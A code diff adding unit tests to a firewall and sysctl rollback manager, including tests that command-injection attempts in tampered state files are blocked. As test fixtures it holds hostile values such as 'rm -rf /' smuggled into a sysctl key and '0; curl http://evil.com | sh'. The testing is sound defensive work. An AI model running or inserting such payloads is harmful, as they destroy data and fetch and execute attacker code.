@@ -50,6 +50,13 @@ describe("rollback", () => {
         return RollbackManager.getInstance();
     }
 
+    /**
+     * Helper: import the RollbackCommand type for use in tests.
+     */
+    async function importTypes() {
+        return await import("../../src/core/rollback.js");
+    }
+
     // ── Constructor / initialization ──────────────────────────────────────
 
     describe("initialization", () => {
@@ -151,6 +158,53 @@ describe("rollback", () => {
 
             const changes = manager.listChanges();
             expect(changes.length).toBe(3);
+        });
+
+        it("should accept a structured rollbackCommand", async () => {
+            const manager = await createFreshManager();
+            manager.trackChange(
+                "op-fw-1",
+                "firewall",
+                "INPUT",
+                "iptables -D INPUT -s 1.2.3.4 -j DROP",
+                undefined,
+                { command: "iptables", args: ["-D", "INPUT", "-s", "1.2.3.4", "-j", "DROP"] }
+            );
+
+            const changes = manager.listChanges();
+            expect(changes.length).toBe(1);
+            expect(changes[0].rollbackCommand).toEqual({
+                command: "iptables",
+                args: ["-D", "INPUT", "-s", "1.2.3.4", "-j", "DROP"],
+            });
+        });
+
+        it("should persist rollbackCommand to disk", async () => {
+            const manager = await createFreshManager();
+            manager.trackChange(
+                "op-fw-2",
+                "firewall",
+                "INPUT",
+                "iptables -D INPUT -s 10.0.0.1 -j REJECT",
+                undefined,
+                { command: "iptables", args: ["-D", "INPUT", "-s", "10.0.0.1", "-j", "REJECT"] }
+            );
+
+            // Read the state file directly
+            const raw = readFileSync(statePath, "utf-8");
+            const state = JSON.parse(raw);
+            expect(state.changes[0].rollbackCommand).toEqual({
+                command: "iptables",
+                args: ["-D", "INPUT", "-s", "10.0.0.1", "-j", "REJECT"],
+            });
+        });
+
+        it("should not include rollbackCommand when not provided", async () => {
+            const manager = await createFreshManager();
+            manager.trackChange("op-1", "sysctl", "net.ipv4.ip_forward", "0");
+
+            const changes = manager.listChanges();
+            expect(changes[0].rollbackCommand).toBeUndefined();
         });
     });
 
@@ -305,6 +359,256 @@ describe("rollback", () => {
             await expect(manager.rollbackSession("nonexistent-session")).rejects.toThrow(
                 /no pending changes/i
             );
+        });
+    });
+
+    // ── CORE-003: Injection protection ───────────────────────────────────
+
+    describe("CORE-003: rollback command injection protection", () => {
+        it("should block firewall rollback with non-allowlisted command in originalValue", async () => {
+            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
+            secureMkdirSync(kaliDir);
+
+            // Simulate a tampered state file with a non-allowlisted command
+            const state = {
+                version: 1,
+                changes: [
+                    {
+                        id: "tampered-1",
+                        operationId: "evil-op",
+                        sessionId: "evil-session",
+                        type: "firewall",
+                        target: "INPUT",
+                        originalValue: "/tmp/evil-binary -D INPUT -s 1.2.3.4 -j DROP",
+                        timestamp: "2025-01-01T00:00:00.000Z",
+                        rolledBack: false,
+                    },
+                ],
+            };
+            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");
+
+            const manager = await createFreshManager();
+            const changes = manager.listChanges();
+            expect(changes.length).toBe(1);
+
+            // The rollback should fail silently (logs error) because
+            // /tmp/evil-binary is not in the allowlist
+            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+            try {
+                await manager.rollback("evil-op");
+                // After rollback attempt, verify the record was NOT marked as rolled back
+                const postChanges = manager.listChanges();
+                expect(postChanges[0].rolledBack).toBe(false);
+                // Verify error was logged about allowlist
+                expect(consoleSpy).toHaveBeenCalledWith(
+                    expect.stringContaining("not in the command allowlist")
+                );
+            } finally {
+                consoleSpy.mockRestore();
+            }
+        });
+
+        it("should block firewall rollback with shell injection in originalValue", async () => {
+            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
+            secureMkdirSync(kaliDir);
+
+            // Simulate a tampered state file with shell metacharacters injected
+            const state = {
+                version: 1,
+                changes: [
+                    {
+                        id: "tampered-2",
+                        operationId: "inject-op",
+                        sessionId: "inject-session",
+                        type: "firewall",
+                        target: "INPUT",
+                        originalValue: "bash -c 'rm -rf /'",
+                        timestamp: "2025-01-01T00:00:00.000Z",
+                        rolledBack: false,
+                    },
+                ],
+            };
+            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");
+
+            const manager = await createFreshManager();
+            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+            try {
+                await manager.rollback("inject-op");
+                const postChanges = manager.listChanges();
+                expect(postChanges[0].rolledBack).toBe(false);
+                expect(consoleSpy).toHaveBeenCalledWith(
+                    expect.stringContaining("not in the command allowlist")
+                );
+            } finally {
+                consoleSpy.mockRestore();
+            }
+        });
+
+        it("should block firewall rollback with non-allowlisted command in rollbackCommand field", async () => {
+            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
+            secureMkdirSync(kaliDir);
+
+            // Simulate a tampered state file with structured but non-allowlisted command
+            const state = {
+                version: 1,
+                changes: [
+                    {
+                        id: "tampered-3",
+                        operationId: "struct-evil-op",
+                        sessionId: "struct-evil-session",
+                        type: "firewall",
+                        target: "INPUT",
+                        originalValue: "iptables -D INPUT -s 1.2.3.4 -j DROP",
+                        rollbackCommand: {
+                            command: "/tmp/trojan",
+                            args: ["-D", "INPUT"],
+                        },
+                        timestamp: "2025-01-01T00:00:00.000Z",
+                        rolledBack: false,
+                    },
+                ],
+            };
+            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");
+
+            const manager = await createFreshManager();
+            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+            try {
+                await manager.rollback("struct-evil-op");
+                const postChanges = manager.listChanges();
+                expect(postChanges[0].rolledBack).toBe(false);
+                expect(consoleSpy).toHaveBeenCalledWith(
+                    expect.stringContaining("not in the command allowlist")
+                );
+            } finally {
+                consoleSpy.mockRestore();
+            }
+        });
+
+        it("should block sysctl rollback with invalid key (shell metacharacters)", async () => {
+            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
+            secureMkdirSync(kaliDir);
+
+            const state = {
+                version: 1,
+                changes: [
+                    {
+                        id: "tampered-sysctl-1",
+                        operationId: "sysctl-evil-op",
+                        sessionId: "sysctl-evil-session",
+                        type: "sysctl",
+                        target: "net.ipv4.ip_forward; rm -rf /",
+                        originalValue: "0",
+                        timestamp: "2025-01-01T00:00:00.000Z",
+                        rolledBack: false,
+                    },
+                ],
+            };
+            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");
+
+            const manager = await createFreshManager();
+            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+            try {
+                await manager.rollback("sysctl-evil-op");
+                const postChanges = manager.listChanges();
+                expect(postChanges[0].rolledBack).toBe(false);
+                expect(consoleSpy).toHaveBeenCalledWith(
+                    expect.stringContaining("Invalid sysctl key")
+                );
+            } finally {
+                consoleSpy.mockRestore();
+            }
+        });
+
+        it("should block sysctl rollback with malicious value", async () => {
+            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
+            secureMkdirSync(kaliDir);
+
+            const state = {
+                version: 1,
+                changes: [
+                    {
+                        id: "tampered-sysctl-2",
+                        operationId: "sysctl-val-evil",
+                        sessionId: "sysctl-val-evil-session",
+                        type: "sysctl",
+                        target: "net.ipv4.ip_forward",
+                        originalValue: "0; curl http://evil.com | sh",
+                        timestamp: "2025-01-01T00:00:00.000Z",
+                        rolledBack: false,
+                    },
+                ],
+            };
+            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");
+
+            const manager = await createFreshManager();
+            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+            try {
+                await manager.rollback("sysctl-val-evil");
+                const postChanges = manager.listChanges();
+                expect(postChanges[0].rolledBack).toBe(false);
+                expect(consoleSpy).toHaveBeenCalledWith(
+                    expect.stringContaining("Invalid sysctl value")
+                );
+            } finally {
+                consoleSpy.mockRestore();
+            }
+        });
+
+        it("should block firewall rollback when originalValue is too short", async () => {
+            const { secureMkdirSync, secureWriteFileSync } = await import("../../src/core/secure-fs.js");
+            secureMkdirSync(kaliDir);
+
+            const state = {
+                version: 1,
+                changes: [
+                    {
+                        id: "short-cmd",
+                        operationId: "short-op",
+                        sessionId: "short-session",
+                        type: "firewall",
+                        target: "INPUT",
+                        originalValue: "iptables",
+                        timestamp: "2025-01-01T00:00:00.000Z",
+                        rolledBack: false,
+                    },
+                ],
+            };
+            secureWriteFileSync(statePath, JSON.stringify(state), "utf-8");
+
+            const manager = await createFreshManager();
+            const consoleSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+            try {
+                await manager.rollback("short-op");
+                const postChanges = manager.listChanges();
+                expect(postChanges[0].rolledBack).toBe(false);
+                expect(consoleSpy).toHaveBeenCalledWith(
+                    expect.stringContaining("too short")
+                );
+            } finally {
+                consoleSpy.mockRestore();
+            }
+        });
+
+        it("should reload structured rollbackCommand from persisted state", async () => {
+            // Track a change with structured command
+            const m1 = await createFreshManager();
+            m1.trackChange(
+                "op-persist-1",
+                "firewall",
+                "INPUT",
+                "iptables -D INPUT -s 5.6.7.8 -j DROP",
+                undefined,
+                { command: "iptables", args: ["-D", "INPUT", "-s", "5.6.7.8", "-j", "DROP"] }
+            );
+
+            // Create new manager to simulate restart, verify it loads the structured command
+            const m2 = await createFreshManager();
+            const changes = m2.listChanges();
+            expect(changes.length).toBe(1);
+            expect(changes[0].rollbackCommand).toEqual({
+                command: "iptables",
+                args: ["-D", "INPUT", "-s", "5.6.7.8", "-j", "DROP"],
+            });
         });
     });
 });
